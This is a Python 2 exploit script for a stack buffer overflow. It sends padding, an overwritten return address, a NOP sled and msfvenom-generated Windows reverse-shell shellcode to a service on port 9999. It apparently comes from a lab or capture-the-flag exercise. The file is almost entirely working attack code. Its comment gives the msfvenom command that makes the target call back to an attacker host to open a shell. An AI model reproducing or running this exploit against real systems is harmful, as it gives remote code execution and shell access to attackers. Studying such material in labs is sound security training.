#!/usr/bin/python 

import socket,sys

address = '10.10.215.221'
port = 9999

# Sending the pattern to check
buffer = 'A' * 524
eip = '\xf3\x12\x17\x31' # 0x311712F3
nops = '\x90' * 20

# only bad char is x00
# msfvenom -p windows/shell_reverse_tcp -b '\x00' LHOST=10.6.19.60 LPORT=1234 -v shellcode -f python EXITFUNC=thread 
shellcode =  ""
shellcode += "\xbb\x0c\xdd\x94\x04\xdb\xd2\xd9\x74\x24\xf4"
shellcode += "\x5f\x33\xc9\xb1\x52\x31\x5f\x12\x83\xc7\x04"
shellcode += "\x03\x53\xd3\x76\xf1\x97\x03\xf4\xfa\x67\xd4"
shellcode += "\x99\x73\x82\xe5\x99\xe0\xc7\x56\x2a\x62\x85"
shellcode += "\x5a\xc1\x26\x3d\xe8\xa7\xee\x32\x59\x0d\xc9"
shellcode += "\x7d\x5a\x3e\x29\x1c\xd8\x3d\x7e\xfe\xe1\x8d"
shellcode += "\x73\xff\x26\xf3\x7e\xad\xff\x7f\x2c\x41\x8b"
shellcode += "\xca\xed\xea\xc7\xdb\x75\x0f\x9f\xda\x54\x9e"
shellcode += "\xab\x84\x76\x21\x7f\xbd\x3e\x39\x9c\xf8\x89"
shellcode += "\xb2\x56\x76\x08\x12\xa7\x77\xa7\x5b\x07\x8a"
shellcode += "\xb9\x9c\xa0\x75\xcc\xd4\xd2\x08\xd7\x23\xa8"
shellcode += "\xd6\x52\xb7\x0a\x9c\xc5\x13\xaa\x71\x93\xd0"
shellcode += "\xa0\x3e\xd7\xbe\xa4\xc1\x34\xb5\xd1\x4a\xbb"
shellcode += "\x19\x50\x08\x98\xbd\x38\xca\x81\xe4\xe4\xbd"
shellcode += "\xbe\xf6\x46\x61\x1b\x7d\x6a\x76\x16\xdc\xe3"
shellcode += "\xbb\x1b\xde\xf3\xd3\x2c\xad\xc1\x7c\x87\x39"
shellcode += "\x6a\xf4\x01\xbe\x8d\x2f\xf5\x50\x70\xd0\x06"
shellcode += "\x79\xb7\x84\x56\x11\x1e\xa5\x3c\xe1\x9f\x70"
shellcode += "\x92\xb1\x0f\x2b\x53\x61\xf0\x9b\x3b\x6b\xff"
shellcode += "\xc4\x5c\x94\xd5\x6c\xf6\x6f\xbe\x98\x01\x7c"
shellcode += "\x02\xf5\x0f\x82\x7e\xd7\x99\x64\x14\xc7\xcf"
shellcode += "\x3f\x81\x7e\x4a\xcb\x30\x7e\x40\xb6\x73\xf4"
shellcode += "\x67\x47\x3d\xfd\x02\x5b\xaa\x0d\x59\x01\x7d"
shellcode += "\x11\x77\x2d\xe1\x80\x1c\xad\x6c\xb9\x8a\xfa"
shellcode += "\x39\x0f\xc3\x6e\xd4\x36\x7d\x8c\x25\xae\x46"
shellcode += "\x14\xf2\x13\x48\x95\x77\x2f\x6e\x85\x41\xb0"
shellcode += "\x2a\xf1\x1d\xe7\xe4\xaf\xdb\x51\x47\x19\xb2"
shellcode += "\x0e\x01\xcd\x43\x7d\x92\x8b\x4b\xa8\x64\x73"
shellcode += "\xfd\x05\x31\x8c\x32\xc2\xb5\xf5\x2e\x72\x39"
shellcode += "\x2c\xeb\x92\xd8\xe4\x06\x3b\x45\x6d\xab\x26"
shellcode += "\x76\x58\xe8\x5e\xf5\x68\x91\xa4\xe5\x19\x94"
shellcode += "\xe1\xa1\xf2\xe4\x7a\x44\xf4\x5b\x7a\x4d"

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + eip + nops + shellcode + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
